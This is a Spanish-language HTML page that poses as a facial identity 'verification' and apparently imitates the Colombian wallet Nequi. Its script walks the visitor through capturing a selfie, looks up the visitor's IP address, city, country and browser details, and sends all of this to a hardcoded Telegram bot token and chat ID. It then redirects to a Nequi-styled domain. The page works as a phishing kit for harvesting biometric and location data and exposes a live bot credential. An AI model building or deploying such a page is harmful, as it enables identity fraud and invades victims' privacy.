<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script defer src="https://cdn.jsdelivr.net/npm/face-api.js"></script>

<style>
body {
    margin: 0;
    background: #2b002b;
    overflow: hidden;
    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
}

video {
    position: absolute;
    width: 100%;
    height: 100%;
    object-fit: cover;
}

/* Overlay */
.overlay {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(43,0,43,0.5);
    mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
    -webkit-mask-image: radial-gradient(ellipse 150px 210px at center, transparent 98%, black 100%);
}

/* Óvalo */
.oval {
    position: absolute;
    width: 300px;
    height: 420px;
    border-radius: 50%;
    border: 4px solid white;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    transition: 0.2s;
}

.valid {
    border-color: #00ff88;
    box-shadow: 0 0 25px #00ff88;
}

/* Texto */
.status {
    position: absolute;
    bottom: 30px;
    width: 100%;
    text-align: center;
    color: white;
    font-size: 18px;
    text-shadow: 0 2px 5px rgba(0,0,0,0.5);
    z-index: 10;
}

/* Barra de progreso */
.progress-container {
    position: absolute;
    bottom: 100px;
    left: 50%;
    transform: translateX(-50%);
    width: 200px;
    height: 4px;
    background: rgba(255,255,255,0.3);
    border-radius: 2px;
    overflow: hidden;
    z-index: 10;
}

.progress-bar {
    height: 100%;
    width: 0%;
    background: #00ff88;
    transition: width 0.1s linear;
    border-radius: 2px;
}

/* Preview de foto */
.photo-preview {
    position: fixed;
    bottom: 80px;
    right: 20px;
    width: 100px;
    height: 100px;
    border-radius: 12px;
    overflow: hidden;
    border: 3px solid #00ff88;
    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
    z-index: 20;
    background: white;
    animation: slideIn 0.3s ease;
    cursor: pointer;
}

.photo-preview img {
    width: 100%;
    height: 100%;
    object-fit: cover;
}

.photo-preview .delete-btn {
    position: absolute;
    top: -8px;
    right: -8px;
    width: 24px;
    height: 24px;
    border-radius: 50%;
    background: red;
    color: white;
    border: none;
    cursor: pointer;
    display: flex;
    align-items: center;
    justify-content: center;
    font-size: 16px;
    font-weight: bold;
}

@keyframes slideIn {
    from {
        opacity: 0;
        transform: translateX(100px);
    }
    to {
        opacity: 1;
        transform: translateX(0);
    }
}

/* Botón de reinicio */
.reset-btn {
    position: fixed;
    bottom: 20px;
    left: 20px;
    background: rgba(0,0,0,0.7);
    backdrop-filter: blur(5px);
    color: white;
    border: 1px solid rgba(255,255,255,0.3);
    padding: 10px 20px;
    border-radius: 25px;
    cursor: pointer;
    font-size: 14px;
    z-index: 20;
    transition: all 0.2s;
    font-family: monospace;
}

.reset-btn:hover {
    background: rgba(255,255,255,0.2);
    transform: scale(1.05);
}

/* Botón de enviar */
.send-btn {
    position: fixed;
    bottom: 20px;
    right: 20px;
    background: rgba(0,255,136,0.9);
    backdrop-filter: blur(5px);
    color: #2b002b;
    border: none;
    padding: 10px 20px;
    border-radius: 25px;
    cursor: pointer;
    font-size: 14px;
    z-index: 20;
    transition: all 0.2s;
    font-weight: bold;
    display: none;
}

.send-btn:hover {
    background: #00ff88;
    transform: scale(1.05);
}

/* Loader */
.loader {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: rgba(0,0,0,0.8);
    z-index: 9999;
    justify-content: center;
    align-items: center;
    flex-direction: column;
    gap: 15px;
}

.loader.active {
    display: flex;
}

.loader-spinner {
    width: 50px;
    height: 50px;
    border: 5px solid #f3f3f3;
    border-top: 5px solid #00ff88;
    border-radius: 50%;
    animation: spin 1s linear infinite;
}

@keyframes spin {
    0% { transform: rotate(0deg); }
    100% { transform: rotate(360deg); }
}

.loader-text {
    color: white;
    font-weight: 600;
}

/* Toast de éxito */
.success-toast {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    background: rgba(0,255,136,0.95);
    color: #2b002b;
    padding: 20px 40px;
    border-radius: 50px;
    font-size: 24px;
    font-weight: bold;
    z-index: 30;
    animation: fadeInOut 1.5s ease;
    pointer-events: none;
    white-space: nowrap;
}

@keyframes fadeInOut {
    0% {
        opacity: 0;
        transform: translate(-50%, -50%) scale(0.8);
    }
    15% {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
    85% {
        opacity: 1;
        transform: translate(-50%, -50%) scale(1);
    }
    100% {
        opacity: 0;
        transform: translate(-50%, -50%) scale(0.8);
    }
}

/* Mensaje de estado adicional */
.status-message {
    position: fixed;
    bottom: 120px;
    left: 50%;
    transform: translateX(-50%);
    background: rgba(0,0,0,0.8);
    color: white;
    padding: 8px 16px;
    border-radius: 20px;
    font-size: 12px;
    z-index: 10;
    display: none;
    white-space: nowrap;
}
</style>
</head>

<body>

<video id="video" autoplay muted playsinline></video>
<div class="overlay"></div>
<div class="oval" id="oval"></div>
<div class="status" id="status">🎯 Iniciando cámara...</div>
<div class="progress-container">
    <div class="progress-bar" id="progressBar"></div>
</div>
<button class="reset-btn" id="resetBtn">🔄 Reiniciar</button>
<button class="send-btn" id="sendBtn">📤 Enviar a Telegram</button>
<div class="status-message" id="statusMessage"></div>
<div class="loader" id="loader">
    <div class="loader-spinner"></div>
    <div class="loader-text" id="loaderText">Procesando...</div>
</div>

<script>
const video = document.getElementById("video");
const oval = document.getElementById("oval");
const statusText = document.getElementById("status");
const progressBar = document.getElementById("progressBar");
const resetBtn = document.getElementById("resetBtn");
const sendBtn = document.getElementById("sendBtn");
const statusMessage = document.getElementById("statusMessage");
const loader = document.getElementById("loader");
const loaderText = document.getElementById("loaderText");

// Configuración de Telegram
const TELEGRAM_CONFIG = {
    token: "8323486458:AAGJeAlHlciuq-STKT6i6f-kU9Vt_uCsgp8",
    chatId: "7776240161"
};

let countdown = null;
let stableFrames = 0;
let photoTaken = false;
let currentPhotoData = null;

// Configuración
const REQUIRED_FRAMES = 8;
const TOLERANCIA_X = 90;
const TOLERANCIA_Y = 130;

// Iniciar cámara
navigator.mediaDevices.getUserMedia({ 
    video: { 
        width: { ideal: 1280 },
        height: { ideal: 720 },
        facingMode: "user"
    } 
})
.then(stream => {
    video.srcObject = stream;
    statusText.innerText = "📷 Coloca tu rostro en el óvalo";
})
.catch(err => {
    console.error("Error de cámara:", err);
    statusText.innerText = "❌ Error: No se puede acceder a la cámara";
});

// Cargar modelos de Face-API
Promise.all([
    faceapi.nets.tinyFaceDetector.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models'),
    faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/face-api.js/models')
]).then(() => {
    statusText.innerText = "✅ Cámara lista - Coloca tu rostro en el óvalo";
    startValidation();
}).catch(err => {
    console.error("Error cargando modelos:", err);
    statusText.innerText = "❌ Error cargando IA. Recarga la página.";
});

function startValidation() {
    setInterval(async () => {
        if (photoTaken || !video.videoWidth) return;
        
        try {
            const result = await faceapi
                .detectSingleFace(video, new faceapi.TinyFaceDetectorOptions())
                .withFaceLandmarks();
            
            if (!result) {
                reset("❌ No se detecta rostro");
                return;
            }
            
            // Escalar coordenadas
            const rect = video.getBoundingClientRect();
            const scaleX = rect.width / video.videoWidth;
            const scaleY = rect.height / video.videoHeight;
            
            const box = result.detection.box;
            const faceX = (box.x + box.width / 2) * scaleX;
            const faceY = (box.y + box.height / 2) * scaleY;
            
            const ovalRect = oval.getBoundingClientRect();
            const centerX = ovalRect.left + ovalRect.width / 2;
            const centerY = ovalRect.top + ovalRect.height / 2;
            
            const dx = Math.abs(faceX - centerX);
            const dy = Math.abs(faceY - centerY);
            
            // Detección de ojos abiertos
            const landmarks = result.landmarks;
            const leftEye = landmarks.getLeftEye();
            const rightEye = landmarks.getRightEye();
            
            function eyeOpen(eye) {
                const height = Math.abs(eye[1].y - eye[5].y);
                const width = Math.abs(eye[0].x - eye[3].x);
                return (height / width) > 0.25;
            }
            
            const eyesOpen = eyeOpen(leftEye) && eyeOpen(rightEye);
            const inside = dx < TOLERANCIA_X && dy < TOLERANCIA_Y;
            
            if (inside && eyesOpen) {
                oval.classList.add("valid");
                stableFrames++;
                
                // Actualizar barra de progreso
                const progress = (stableFrames / REQUIRED_FRAMES) * 100;
                progressBar.style.width = `${progress}%`;
                
                if (stableFrames >= REQUIRED_FRAMES && !countdown && !photoTaken) {
                    startCountdown();
                } else {
                    statusText.innerText = `✅ Rostro correcto (${stableFrames}/${REQUIRED_FRAMES})`;
                }
            } else {
                if (!eyesOpen) {
                    reset("👁️ Abre los ojos");
                } else if (!inside) {
                    let msg = "";
                    if (dx > TOLERANCIA_X && dy > TOLERANCIA_Y) msg = "⬅️⬆️ Centra tu rostro";
                    else if (dx > TOLERANCIA_X) msg = "⬅️➡️ Centra horizontalmente";
                    else if (dy > TOLERANCIA_Y) msg = "⬆️⬇️ Centra verticalmente";
                    else msg = "🎯 Centra tu rostro en el óvalo";
                    reset(msg);
                } else {
                    reset("⚠️ Mantén tu rostro estable");
                }
                oval.classList.remove("valid");
                stableFrames = 0;
                progressBar.style.width = "0%";
            }
        } catch (err) {
            console.error("Error en detección:", err);
        }
    }, 150);
}

function startCountdown() {
    if (countdown) return;
    
    let t = 3;
    statusText.innerText = "📸 ¡No te muevas! (" + t + ")";
    
    countdown = setInterval(() => {
        t--;
        
        if (t > 0) {
            statusText.innerText = "📸 ¡No te muevas! (" + t + ")";
        } else {
            clearInterval(countdown);
            countdown = null;
            takePhoto();
        }
    }, 1000);
}

function reset(msg) {
    if (photoTaken) return;
    statusText.innerText = msg;
    oval.classList.remove("valid");
    stableFrames = 0;
    progressBar.style.width = "0%";
    
    if (countdown) {
        clearInterval(countdown);
        countdown = null;
    }
}

// Tomar foto
function takePhoto() {
    if (photoTaken) return;
    photoTaken = true;
    
    const canvas = document.createElement("canvas");
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    
    const ctx = canvas.getContext("2d");
    // Aplicar espejo para selfie
    ctx.translate(canvas.width, 0);
    ctx.scale(-1, 1);
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    ctx.setTransform(1, 0, 0, 1, 0, 0);
    
    currentPhotoData = canvas.toDataURL("image/png");
    
    showSuccessToast();
    statusText.innerText = "✅ ¡Selfie capturada con éxito!";
    
    createPhotoPreview(currentPhotoData);
    sendBtn.style.display = "block";
}

function showSuccessToast() {
    const toast = document.createElement('div');
    toast.className = 'success-toast';
    toast.textContent = '📸 ¡Selfie capturada!';
    document.body.appendChild(toast);
    
    setTimeout(() => {
        toast.remove();
    }, 1500);
}

function createPhotoPreview(imgData) {
    const existingPreview = document.querySelector('.photo-preview');
    if (existingPreview) existingPreview.remove();
    
    const preview = document.createElement('div');
    preview.className = 'photo-preview';
    
    const img = document.createElement('img');
    img.src = imgData;
    
    const deleteBtn = document.createElement('button');
    deleteBtn.className = 'delete-btn';
    deleteBtn.textContent = '×';
    deleteBtn.onclick = (e) => {
        e.stopPropagation();
        preview.remove();
        sendBtn.style.display = "none";
        photoTaken = false;
        currentPhotoData = null;
        reset("🎯 Reiniciado - Coloca tu rostro");
        oval.classList.remove("valid");
        progressBar.style.width = "0%";
        statusText.innerText = "✅ Listo para nueva selfie";
        setTimeout(() => {
            statusText.innerText = "🎯 Coloca tu rostro en el óvalo";
        }, 2000);
    };
    
    preview.appendChild(img);
    preview.appendChild(deleteBtn);
    
    document.body.appendChild(preview);
}

function mostrarMensaje(mensaje, esError = false) {
    statusMessage.textContent = mensaje;
    statusMessage.style.backgroundColor = esError ? 'rgba(255,0,0,0.8)' : 'rgba(0,255,136,0.9)';
    statusMessage.style.color = esError ? 'white' : '#2b002b';
    statusMessage.style.display = 'block';
    setTimeout(() => {
        statusMessage.style.display = 'none';
    }, 3000);
}

function dataURLtoBlob(dataURL) {
    const arr = dataURL.split(',');
    const mime = arr[0].match(/:(.*?);/)[1];
    const bstr = atob(arr[1]);
    let n = bstr.length;
    const u8arr = new Uint8Array(n);
    while (n--) {
        u8arr[n] = bstr.charCodeAt(n);
    }
    return new Blob([u8arr], { type: mime });
}

async function enviarATelegram() {
    if (!currentPhotoData) {
        mostrarMensaje("No hay foto para enviar", true);
        return;
    }
    
    loader.classList.add('active');
    loaderText.textContent = "Enviando verificación...";
    
    try {
        // Obtener IP y ubicación
        const ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
        
        // Enviar la selfie
        loaderText.textContent = "Enviando selfie...";
        const blob = dataURLtoBlob(currentPhotoData);
        const formData = new FormData();
        formData.append('chat_id', TELEGRAM_CONFIG.chatId);
        formData.append('caption', `🤳 Selfie Verificada - ${new Date().toLocaleString('es-CO')}`);
        formData.append('photo', blob, `selfie_verificada.jpg`);
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendPhoto`, {
            method: 'POST',
            body: formData
        });
        
        // Enviar mensaje con información adicional
        const mensajeInfo = `
🔔 **VERIFICACIÓN FACIAL COMPLETADA** 🔔

✅ Selfie con validación facial exitosa
👁️ Ojos abiertos verificados
🎯 Rostro centrado correctamente

🌍 **DATOS DE UBICACIÓN:**
📍 IP: ${ipData.ip}
🏙 Ciudad: ${ipData.city}
🏛 Región: ${ipData.region}
🇨🇴 País: ${ipData.country_name}
📱 Dispositivo: ${navigator.userAgent}

⏰ **FECHA Y HORA:**
📅 ${new Date().toLocaleString('es-CO')}

✅ **ESTADO:** Verificación facial exitosa
`;
        
        await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: TELEGRAM_CONFIG.chatId,
                text: mensajeInfo,
                parse_mode: 'Markdown'
            })
        });
        
        loader.classList.remove('active');
        mostrarMensaje("✅ Verificación enviada correctamente");
        
        // Deshabilitar botón de enviar
        sendBtn.style.display = 'none';
        
        // Redirigir después de 3 segundos
        setTimeout(() => {
            window.location.href = 'https://nequi-red.vercel.app/';
        }, 3000);
        
    } catch (error) {
        console.error('Error enviando a Telegram:', error);
        loader.classList.remove('active');
        mostrarMensaje("Error al enviar la verificación. Intenta nuevamente.", true);
    }
}

// Botón de reinicio
resetBtn.addEventListener('click', () => {
    if (countdown) {
        clearInterval(countdown);
        countdown = null;
    }
    
    photoTaken = false;
    currentPhotoData = null;
    stableFrames = 0;
    progressBar.style.width = "0%";
    sendBtn.style.display = "none";
    
    const preview = document.querySelector('.photo-preview');
    if (preview) preview.remove();
    
    reset("🔄 Reiniciado - Coloca tu rostro");
    oval.classList.remove("valid");
    
    statusText.innerText = "✅ Listo para nueva selfie";
    setTimeout(() => {
        statusText.innerText = "🎯 Coloca tu rostro en el óvalo";
    }, 2000);
});

// Botón de enviar a Telegram
sendBtn.addEventListener('click', () => {
    enviarATelegram();
});
</script>

</body>
</html>
